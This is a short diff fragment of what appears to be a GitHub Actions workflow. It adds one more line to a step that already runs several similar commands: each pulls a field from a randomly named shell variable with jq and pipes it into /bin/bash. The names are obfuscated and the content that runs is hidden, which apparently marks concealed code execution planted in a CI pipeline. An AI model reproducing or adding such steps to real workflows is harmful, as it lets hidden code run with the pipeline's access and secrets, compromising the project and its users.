@@ -25,6 +25,7 @@ jobs:
           echo $nit143 | jq -r .boudm63508 | /bin/bash
           printf '%s' "$j1" | jq -r .sbvkq52 | /bin/bash
           echo $adi7 | jq -r .v146 | /bin/bash
+          printf '%s' "$ojup994" | jq -r .dnvn07 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
